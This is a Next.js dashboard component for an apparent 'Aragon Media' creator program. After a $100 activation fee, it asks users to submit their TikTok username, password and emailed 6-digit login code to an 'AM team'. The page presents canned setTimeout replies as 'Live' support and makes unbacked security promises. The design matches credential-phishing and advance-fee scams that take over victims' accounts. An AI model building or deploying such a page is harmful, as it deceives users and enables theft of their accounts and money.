"use client";

import Link from "next/link";
import { useState, useRef, useEffect } from "react";


const STEP_LABELS = [
  "", // 0 unused
  "Payment\nconfirmed",
  "Account\ncreated",
  "Submit\nlogin info",
  "AM verifies\naccount",
  "Start selling\non TikTok",
  "Contact AM\nfor payouts",
  "Withdrawal\nform live",
];

const STEP_STATUSES = [
  "",
  "Step 1 of 7 — Pay activation fee to get started",
  "Step 2 of 7 — Create your portal account",
  "Step 3 of 7 — Submit your login credentials below to continue",
  "Step 4 of 7 — AM team is verifying your TikTok account (up to 24hrs)",
  "Step 5 of 7 — Your account is verified! Start selling on TikTok Shop",
  "Step 6 of 7 — Earning commissions? Contact AM to set up your payouts",
  "Step 7 of 7 — Withdrawal form is now live. Submit anytime Mon–Fri",
];

const PCTS = [0, 12, 25, 37, 50, 62, 75, 87, 100];

const CHECKLIST = [
  { id: 1, title: "Pay $100 activation fee", sub: "Square · Confirmed" },
  { id: 2, title: "Create portal account", sub: "Email verified" },
  { id: 3, title: "Submit TikTok login to AM", sub: "Use the form in chat" },
  { id: 4, title: "AM team verifies account", sub: "Up to 24hrs" },
  { id: 5, title: "Start selling on TikTok Shop", sub: "Promote & earn commissions" },
  { id: 6, title: "Contact AM for payout setup", sub: "Final step before withdrawals" },
  { id: 7, title: "Withdrawal form unlocked", sub: "Submit per withdrawal · Mon–Fri" },
];

type Msg = { who: "am" | "me" | "sys"; name?: string; text: string };

export default function OverviewClient({
  firstName,
  currentStep,
  hasPaid,
  activationFeeCents,
}: {
  firstName: string;
  currentStep: number;
  hasPaid: boolean;
  activationFeeCents: number;
}) {
  const [step] = useState(currentStep);
  const [msgs, setMsgs] = useState<Msg[]>([
    { who: "sys", text: "Today · Account opened" },
    {
      who: "am",
      name: "Aragon Media",
      text: hasPaid
        ? `Hey ${firstName}! Payment confirmed — we're on it. To begin activation, please submit your TikTok login credentials using the form below. 🔒`
        : `Welcome ${firstName}! Once your activation fee is paid, the AM team will start the verification process. Hit "Add Accounts" to get started.`,
    },
    {
      who: "am",
      name: "Aragon Media",
      text: "Also include the 6-digit code sent to your TikTok email when we attempt to sign in — we'll let you know when we need it.",
    },
  ]);
  const [chatInput, setChatInput] = useState("");
  const [credUser, setCredUser] = useState("");
  const [credPass, setCredPass] = useState("");
  const [credCode, setCredCode] = useState("");
  const [submittedCreds, setSubmittedCreds] = useState(false);
  const chatRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (chatRef.current) {
      chatRef.current.scrollTop = chatRef.current.scrollHeight;
    }
  }, [msgs]);

  function sendMsg() {
    const v = chatInput.trim();
    if (!v) return;
    setMsgs((m) => [...m, { who: "me", name: "You", text: v }]);
    setChatInput("");
    setTimeout(() => {
      setMsgs((m) => [
        ...m,
        {
          who: "am",
          name: "Aragon Media",
          text: "Thanks for your message — the AM team will respond shortly.",
        },
      ]);
    }, 900);
  }

  async function submitCreds() {
    if (!credUser || !credPass || submittedCreds) return;
    setSubmittedCreds(true);
    setMsgs((m) => [
      ...m,
      { who: "me", name: "You", text: "🔒 Credentials submitted via secure form." },
    ]);
    try {
      const res = await fetch("/api/accounts/credentials", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: credUser, password: credPass, code: credCode }),
      });
      const data = (await res.json()) as { ok: boolean; error?: string };
      setMsgs((m) => [
        ...m,
        {
          who: "am",
          name: "Aragon Media",
          text: data.ok
            ? "Got them. We'll begin verification within 24 hours and ping you here when the 6-digit code is needed."
            : `Couldn't accept credentials: ${data.error || "unknown error"}. Try again or message us in chat.`,
        },
      ]);
      if (data.ok) {
        // Refresh after a beat so the roadmap step updates and the cred form locks
        setTimeout(() => window.location.reload(), 1600);
      } else {
        setSubmittedCreds(false);
      }
    } catch (err) {
      setSubmittedCreds(false);
      setMsgs((m) => [...m, { who: "am", name: "Aragon Media", text: `Network error: ${err instanceof Error ? err.message : String(err)}` }]);
    }
  }

  const initials =
    firstName
      .split(/\s+/)
      .map((p) => p[0]?.toUpperCase() ?? "")
      .slice(0, 2)
      .join("") || "??";

  return (
    <main className="dash-content">
      {/* === ACTIVATION ROADMAP === */}
      <section className="act-banner">
        <div className="banner-top">
          <div>
            <p className="dash-eyebrow">Aragon Media · Creator Hub</p>
            <h1>Welcome back, {firstName}.</h1>
            <p className="dash-greeting-sub">Account {step >= 5 ? "active" : "activating"} · Track your verification progress in real time below.</p>
          </div>
          <span className="banner-badge" id="activeBadge">{step >= 5 ? "Verified" : `Step ${step} of 8`}</span>
        </div>

        <div className="prog-steps">
          {[1, 2, 3, 4, 5, 6, 7, 8].map((n) => {
            const done = n < step;
            const active = n === step;
            const dotClass = done ? "prog-dot done" : active ? "prog-dot active" : "prog-dot pending";
            const lblClass = done ? "prog-lbl done-lbl" : active ? "prog-lbl gold" : "prog-lbl muted";
            return (
              <div key={`step-${n}`} className="prog-step-wrap">
                <div className="prog-step">
                  <div className={dotClass}>{done ? "✓" : n === 8 ? "✦" : n}</div>
                  <div className={lblClass}>
                    {STEP_LABELS[n].split("\n").map((l, i) => (
                      <span key={i}>{i > 0 && <br />}{l}</span>
                    ))}
                  </div>
                </div>
                {n < 8 && (
                  <div className={`prog-connector${n < step ? " done" : " pending"}`} />
                )}
              </div>
            );
          })}
        </div>

        <div className="prog-bar">
          <div className="prog-fill" style={{ width: `${PCTS[step]}%` }} />
        </div>
        <div className="prog-info">
          <strong>{PCTS[step]}%</strong> complete · <span>{STEP_STATUSES[step]}</span>
        </div>
      </section>

      {/* === STAT CARDS ROW === */}
      <section className="dash-stats">
        <Stat label="Account Status" value={step >= 5 ? "Active" : "Activating"} hint={step >= 5 ? "Verified by AM" : "Pending AM fulfillment"} tone={step >= 5 ? "green" : "gold"} small />
        <Stat label="Total GMV" value="—" hint="Connect TikTok to unlock" tone="green" />
        <Stat label="Revenue Earned" value="—" hint="Connect TikTok to unlock" tone="green" />
        <div className="dash-stat dash-stat-cta">
          <div className="dash-stat-label">{hasPaid ? "Activation Fee" : "Get Started"}</div>
          {hasPaid ? (
            <>
              <div className="dash-stat-value sm">${(activationFeeCents / 100).toFixed(0)}</div>
              <div className="dash-stat-hint">✓ Confirmed via Square</div>
            </>
          ) : (
            <div className="dash-stat-cta-row">
              <Link href="/dashboard/add-account" className="dash-stat-btn">Verify 1st Account →</Link>
              
            </div>
          )}
        </div>
      </section>

      {/* === CHAT + CHECKLIST === */}
      <section className="dash-2col">
        <div className="chat-panel">
          <div className="panel-hdr">
            <div className="panel-title"><span className="live-dot" />AM Team Chat</div>
            <div className="panel-sub">Live · Aragon Media support</div>
          </div>
          <div className="chat-msgs" ref={chatRef}>
            {msgs.map((m, i) => {
              if (m.who === "sys") return <div key={i} className="msg-sys">{m.text}</div>;
              return (
                <div key={i} className={`msg${m.who === "me" ? " mine" : ""}`}>
                  <div className={`msg-av ${m.who}`}>{m.who === "am" ? "AM" : initials}</div>
                  <div className="msg-body">
                    <div className="msg-name">{m.name}</div>
                    <div className="msg-bubble">{m.text}</div>
                  </div>
                </div>
              );
            })}
          </div>

          <div className={`cred-form${step < 3 ? " cred-form-locked" : ""}${submittedCreds ? " cred-form-done" : ""}`}>
            <div className="cred-title">🔒 Submit TikTok Account Login Credentials for Verification</div>
            <div className="cred-sub">
              {step < 3
                ? "Unlocks once your activation fee is paid. Use this form to send your TikTok login to the AM team — never share it in chat."
                : submittedCreds
                ? "Credentials received. The AM team is verifying — they'll ping you in chat if a 2FA code is needed."
                : "Used only by the AM team to complete TikTok account verification. Never shared externally."}
            </div>
            <div className="cred-row">
              <input className="cred-input" placeholder="TikTok username or email" value={credUser} onChange={(e) => setCredUser(e.target.value)} disabled={step < 3 || submittedCreds} />
              <input className="cred-input" type="password" placeholder="Account password" value={credPass} onChange={(e) => setCredPass(e.target.value)} disabled={step < 3 || submittedCreds} />
              <input className="cred-input" placeholder="6-digit email code (when requested)" value={credCode} onChange={(e) => setCredCode(e.target.value)} maxLength={6} disabled={step < 3 || submittedCreds} />
            </div>
            <div className="cred-note">Credentials encrypted at rest, used only to complete verification.</div>
            <button className="cred-submit" onClick={submitCreds} disabled={step < 3 || submittedCreds || !credUser || !credPass}>
              {step < 3 ? "Locked — pay activation fee first" : submittedCreds ? "Sent to AM team" : "Submit Credentials to AM Team →"}
            </button>
          </div>

          <div className="chat-input-row">
            <input className="chat-input" placeholder="Message the AM team…" value={chatInput} onChange={(e) => setChatInput(e.target.value)} onKeyDown={(e) => e.key === "Enter" && sendMsg()} />
            <button className="chat-send" onClick={sendMsg}>Send</button>
          </div>
        </div>

        <div className="ns-panel">
          <div className="panel-hdr">
            <div className="panel-title">Next Steps Checklist</div>
            <div className="panel-sub">{step - 1} of 7 done</div>
          </div>
          <div className="ns-list">
            {CHECKLIST.map((item) => {
              const done = item.id < step;
              const active = item.id === step;
              return (
                <div key={item.id} className={`ns-item${done ? " done-item" : ""}`}>
                  <div className={`ns-check${done ? " checked" : ""}`} style={active ? { borderColor: "#C9A84C" } : undefined}>
                    {done && (
                      <svg viewBox="0 0 9 9" width="9" height="9" fill="none">
                        <polyline points="1.5,4.5 3.5,7 7.5,2" stroke="#0A0A0A" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
                      </svg>
                    )}
                  </div>
                  <div className="ns-text">
                    <div className="ns-ttl">{item.title}</div>
                    <div className="ns-sub">{item.sub}</div>
                  </div>
                  {active && item.id === 1 ? (
                    <Link href="/dashboard/add-account" className="ns-cta">
                      Verify your first account! →
                    </Link>
                  ) : (
                    <span className={`ns-tag ${done ? "done" : active ? "active" : "locked"}`}>
                      {done ? "Done" : active ? "Active" : "Locked"}
                    </span>
                  )}
                </div>
              );
            })}
          </div>
        </div>
      </section>

      {/* === BOTTOM MINI CARDS === */}
      <section className="dash-2col">
        <div className="mini-card">
          <div className="mini-card-hdr">
            <div className="mini-card-title">💸 Withdrawal Form</div>
            <span className={`mini-tag ${step >= 7 ? "available" : "locked"}`}>
              {step >= 7 ? "Unlocked" : "Locked — Complete steps first"}
            </span>
          </div>
          <p>Once you&apos;ve earned TikTok commissions, message the AM team in chat. They&apos;ll grant withdrawal access and send the operations agreement to sign once.</p>
          <Link
            href={step >= 7 ? "/dashboard/withdrawals" : "/dashboard/chat"}
            className={`mini-btn${step >= 7 ? "" : " ghost"}`}
          >
            {step >= 7 ? "Submit Withdrawal →" : "Open chat to unlock →"}
          </Link>
        </div>

        <div className="mini-card">
          <div className="mini-card-hdr">
            <div className="mini-card-title">TikTok Account</div>
            <span className="mini-tag locked">Not connected</span>
          </div>
          <p>Connect your TikTok account via TikTok Partner API to unlock live GMV tracking, revenue breakdown, and commission data.</p>
          <Link href="/dashboard/tiktok-account" className="mini-btn">Connect TikTok →</Link>
        </div>
      </section>
    </main>
  );
}

function Stat({
  label,
  value,
  hint,
  tone,
  small,
}: {
  label: string;
  value: string;
  hint?: string;
  tone?: "green" | "gold";
  small?: boolean;
}) {
  return (
    <div className="dash-stat">
      <div className="dash-stat-label">{label}</div>
      <div className={`dash-stat-value${tone ? ` tone-${tone}` : ""}${small ? " sm" : ""}`}>{value}</div>
      {hint && <div className="dash-stat-hint">{hint}</div>}
    </div>
  );
}
